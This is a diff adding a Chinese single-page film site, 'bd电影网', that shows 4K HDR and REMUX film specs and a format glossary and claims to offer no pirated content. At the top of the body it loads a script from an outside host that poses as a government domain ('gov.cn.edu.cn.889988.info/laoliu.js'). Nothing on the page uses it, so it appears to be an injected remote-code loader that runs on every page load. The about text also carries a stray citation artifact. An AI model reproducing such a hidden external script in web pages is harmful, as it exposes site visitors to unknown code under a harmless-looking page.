@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bd电影网 - 蓝光碟库终端 · 1080P/4K HDR/REMUX 片源档案</title>
+<meta name="description" content="bd电影网，蓝光碟库终端风影视单页：深空黑+钢蓝扫描光，1080P、4K HDR、REMUX、WEB-DL、杜比音轨分架展示。官网 https://bddianyingwang-h5.github.io">
+<meta name="keywords" content="bd电影网, 蓝光, Blu-ray, 4K HDR, REMUX, WEB-DL, 1080P, 高码率电影">
+<meta name="author" content="bd电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0b0d12">
+<style>
+:root{
+  --bg:#0b0d12;
+  --bg2:#11151d;
+  --panel:#141a24;
+  --line:rgba(159,208,255,.22);
+  --steel:#9fd0ff;
+  --cyan:#39e0ff;
+  --silver:#cfd6e6;
+  --gold:#ffd166;
+  --muted:#7e8aa0;
+  --ink:#e8eefc;
+  --shadow:0 18px 40px rgba(0,0,0,.55);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{
+  background:
+    radial-gradient(520px 320px at 88% -12%,rgba(57,224,255,.16),transparent),
+    radial-gradient(460px 300px at -6% 8%,rgba(159,208,255,.14),transparent),
+    repeating-linear-gradient(0deg,rgba(255,255,255,.025) 0 2px,transparent 2px 4px),
+    var(--bg);
+  color:var(--ink);
+  font-family:"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  line-height:1.8;
+}
+a{color:var(--cyan);text-decoration:none}
+
+.bar{
+  position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:12px 18px;border-bottom:1px solid var(--line);
+  background:rgba(11,13,18,.86);backdrop-filter:blur(10px);
+}
+.logo{font-family:Consolas,monospace;font-size:20px;font-weight:800;letter-spacing:1px}
+.logo b{color:var(--cyan)}
+.logo span{font-size:10px;color:var(--muted);letter-spacing:4px;display:block;margin-top:-3px}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:8px;background:var(--panel);color:var(--silver)}
+.nav a:hover{border-color:var(--cyan);color:var(--cyan);box-shadow:0 0 12px rgba(57,224,255,.35)}
+
+.hero{position:relative;max-width:1060px;margin:0 auto;padding:54px 20px 26px}
+.disc{position:absolute;top:8px;right:18px;width:78px;height:78px;border-radius:50%;
+  background:radial-gradient(circle at 50% 50%,#0b0d12 0 18%,var(--steel) 19% 30%,#0b0d12 31% 100%);
+  box-shadow:0 0 22px rgba(159,208,255,.5);animation:spin 9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.kicker{font-family:Consolas,monospace;font-size:12px;color:var(--cyan);letter-spacing:2px}
+.hero h1{font-size:34px;margin:10px 0 8px;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{color:var(--muted);max-width:600px;margin:0 auto 14px;font-size:15px}
+.hero .url{display:inline-block;font-family:Consolas,monospace;font-size:13px;background:var(--panel);
+  border:1px dashed var(--steel);color:var(--steel);padding:8px 16px;border-radius:10px}
+.metrics{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 16px;min-width:108px}
+.metrics b{display:block;font-size:20px;color:var(--cyan);font-family:Consolas,monospace}
+.metrics small{color:var(--muted);font-size:12px}
+
+.wrap{max-width:1080px;margin:0 auto;padding:18px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:28px 0 16px}
+.sec h2{font-size:21px;color:var(--steel);font-weight:900}
+.sec small{color:var(--muted);font-size:12px;letter-spacing:1px}
+.sec .chip{margin-left:auto;font-size:11px;color:#06121a;background:var(--cyan);padding:3px 10px;border-radius:6px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.disc-card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);
+  border-radius:16px;overflow:hidden;box-shadow:var(--shadow);transition:.2s}
+.disc-card:hover{transform:translateY(-4px);border-color:var(--cyan);box-shadow:0 0 22px rgba(57,224,255,.28)}
+.top{height:90px;display:flex;align-items:center;justify-content:center;gap:8px;font-size:30px;color:#06121a;position:relative}
+.top::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.18),transparent 50%)}
+.disc-card:nth-child(6n+1) .top{background:linear-gradient(135deg,#39e0ff,#1f8fd0)}
+.disc-card:nth-child(6n+2) .top{background:linear-gradient(135deg,#cfd6e6,#9aa6bd)}
+.disc-card:nth-child(6n+3) .top{background:linear-gradient(135deg,#ffd166,#d99b2b)}
+.disc-card:nth-child(6n+4) .top{background:linear-gradient(135deg,#9fd0ff,#5b8fd0)}
+.disc-card:nth-child(6n+5) .top{background:linear-gradient(135deg,#7ef0c8,#36b98a)}
+.disc-card:nth-child(6n+6) .top{background:linear-gradient(135deg,#c9a7ff,#7e5bd0)}
+.body{padding:14px}
+.body h3{font-size:16px;color:var(--ink);margin-bottom:3px}
+.body p{font-size:13px;color:var(--muted);margin-bottom:8px}
+.spec{display:flex;gap:6px;flex-wrap:wrap}
+.s{font-size:11px;font-family:Consolas,monospace;padding:2px 8px;border-radius:6px;background:#0c1018;border:1px solid var(--line);color:var(--steel)}
+.bit{margin-top:8px;font-size:12px;color:var(--gold);font-family:Consolas,monospace}
+
+.cols{display:grid;grid-template-columns:1.2fr .8fr;gap:18px;margin-top:26px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:18px}
+.panel h3{font-size:17px;color:var(--steel);margin-bottom:12px}
+.table{width:100%;border-collapse:collapse;font-size:13px}
+.table th,.table td{padding:9px 10px;border-bottom:1px dashed var(--line);text-align:left}
+.table th{color:var(--cyan);font-family:Consolas,monospace;font-weight:700}
+.table td{color:var(--silver)}
+.gloss li{list-style:none;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--silver)}
+.gloss li:last-child{border-bottom:none}
+.gloss b{color:var(--gold);font-family:Consolas,monospace}
+
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:#0c1018;border:1px solid var(--line);color:var(--cyan);padding:2px 7px;border-radius:7px;font-family:Consolas,monospace}
+.foot{text-align:center;padding:26px 20px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
+
+@media(max-width:880px){.grid{grid-template-columns:repeat(2,1fr)}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.grid{grid-template-columns:1fr}.hero h1{font-size:26px}.disc{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>BD</b>电影网<span>BLU-RAY DISC TERMINAL</span></div>
+  <nav class="nav">
+    <a href="#home">碟库</a>
+    <a href="#uhd">4K HDR</a>
+    <a href="#remux">REMUX</a>
+    <a href="#gloss">片源词典</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="disc"></div>
+  <span class="kicker">// terminal.boot("bd_disc_library")</span>
+  <h1>bd电影网 · <em>蓝光碟库终端</em></h1>
+  <p>不凑热搜、不弹会员、不教你怎么“翻出去下片”。这里把 1080P / 4K HDR / REMUX / WEB-DL / 杜比音轨 讲清楚，给真影迷做片源档案。</p>
+  <div class="url">https://bddianyingwang-h5.github.io</div>
+  <div class="metrics">
+    <div><b>4K</b><small>UHD 片源</small></div>
+    <div><b>REMUX</b><small>无损封装</small></div>
+    <div><b>ATMOS</b><small>全景声</small></div>
+    <div><b>0</b><small>磁力/弹窗</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="uhd">
+    <h2>🟦 UHD 架 · 4K HDR / Dolby Vision</h2><small>ultra hd</small><span class="chip">家庭影院</span>
+  </div>
+  <div class="grid">
+    <article class="disc-card">
+      <div class="top">🎞️🛰️</div>
+      <div class="body">
+        <h3>沙丘 2</h3>
+        <p>沙漠、沙虫、巨幕构图。HDR 一开，沙粒和阴影都有体积感。</p>
+        <div class="spec"><span class="s">2160p</span><span class="s">Dolby Vision</span><span class="s">Atmos</span></div>
+        <div class="bit">码率：~85 Mbps</div>
+      </div>
+    </article>
+    <article class="disc-card">
+      <div class="top">🌌🎻</div>
+      <div class="body">
+        <h3>星际穿越</h3>
+        <p>IMAX 胶片转 4K，黑洞、玉米地、管风琴低频，家庭影院试机片。</p>
+        <div class="spec"><span class="s">2160p</span><span class="s">HDR10</span><span class="s">TrueHD 7.1</span></div>
+        <div class="bit">码率：~72 Mbps</div>
+      </div>
+    </article>
+    <article class="disc-card">
+      <div class="top">🏔️🔥</div>
+      <div class="body">
+        <h3>奥本海默</h3>
+        <p>70mm 质感 + 火焰高光，HDR 下不糊成一片白，胶片颗粒保留得好。</p>
+        <div class="spec"><span class="s">2160p</span><span class="s">Dolby Vision</span><span class="s">Atmos</span></div>
+        <div class="bit">码率：~90 Mbps</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="sec" id="remux">
+    <h2>🩷 REMUX 架 · 无损提取不重编码</h2><small>lossless</small><span class="chip">极客最爱</span>
+  </div>
+  <div class="grid">
+    <article class="disc-card">
+      <div class="top">💿🎬</div>
+      <div class="body">
+        <h3>指环王：王者归来</h3>
+        <p>蓝光原盘提取视频+音轨，封装成 mkv，不压码率，硬盘换沉浸感。</p>
+        <div class="spec"><span class="s">1080p</span><span class="s">REMUX</span><span class="s">DTS-HD MA 5.1</span></div>
+        <div class="bit">体积：~38 GB</div>
+      </div>
+    </article>
+    <article class="disc-card">
+      <div class="top">🛸🎧</div>
+      <div class="body">
+        <h3>银翼杀手 2049</h3>
+        <p>霓虹夜景是 HDR 试金石，REMUX 才留得住雨夜高光和人声细节。</p>
+        <div class="spec"><span class="s">2160p</span><span class="s">REMUX</span><span class="s">Atmos</span></div>
+        <div class="bit">体积：~65 GB</div>
+      </div>
+    </article>
+    <article class="disc-card">
+      <div class="top">🎻🏛️</div>
+      <div class="body">
+        <h3>波西米亚狂想曲</h3>
+        <p>现场段是真多声道混音，REMUX 比流媒体压制成品多一层“空气感”。</p>
+        <div class="spec"><span class="s">1080p</span><span class="s">REMUX</span><span class="s">TrueHD 7.1</span></div>
+        <div class="bit">体积：~32 GB</div>
+      </div>
+    </article>
+  </div>
+
+  <div class="cols">
+    <section class="panel">
+      <h3>📊 片源规格对照</h3>
+      <table class="table">
+        <tr><th>标签</th><th>来源</th><th>画质</th><th>体积</th></tr>
+        <tr><td>REMUX</td><td>蓝光原盘提取</td><td>无损</td><td>30–80GB</td></tr>
+        <tr><td>BDRip</td><td>蓝光重编码</td><td>高</td><td>4–10GB</td></tr>
+        <tr><td>WEB-DL</td><td>流媒体抓取</td><td>中高</td><td>2–6GB</td></tr>
+        <tr><td>WEBRip</td><td>录屏/转压</td><td>中</td><td>1–3GB</td></tr>
+        <tr><td>HDTV</td><td>电视录制</td><td>中</td><td>2–5GB</td></tr>
+      </table>
+    </section>
+
+    <section class="panel" id="gloss">
+      <h3>📖 片源词典</h3>
+      <ul class="gloss">
+        <li><b>BD</b> = Blu-ray Disc，蓝光光盘</li>
+        <li><b>UHD</b> = 3840×2160 超高清</li>
+        <li><b>HDR</b> = 高动态范围，亮暗更宽</li>
+        <li><b>REMUX</b> = 不重编码的无损封装</li>
+        <li><b>Atmos</b> = 杜比全景声，对象化混音</li>
+        <li><b>WEB-DL</b> = 流媒体原生下载，非录屏</li>
+      </ul>
+    </section>
+  </div>
+
+  <section class="panel about" style="margin-top:26px">
+    <h3>💿 关于 bd电影网</h3>
+    <p><strong>bd电影网</strong> 是“蓝光碟库终端 / 高码率放映室”风影视单页：深空黑、钢蓝扫描光、碟片旋转、REMUX 档案表。名字借 BD（Blu-ray）的影迷语境，但做法走正路——只做片源知识、片单与规格展示。[7](@ref)</p>
+    <p>官网：<code>https://bddianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本终端不提供磁力链接、不解析第三方源、不教改 DNS 翻墙下载、不托管受版权保护视频。想看高画质，走正版 UHD 碟、授权流媒体、资料馆放映。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 bd电影网 · bddianyingwang-h5.github.io · 碟转起来，灯关下去 💿
+</footer>
+
+</body>
+</html>
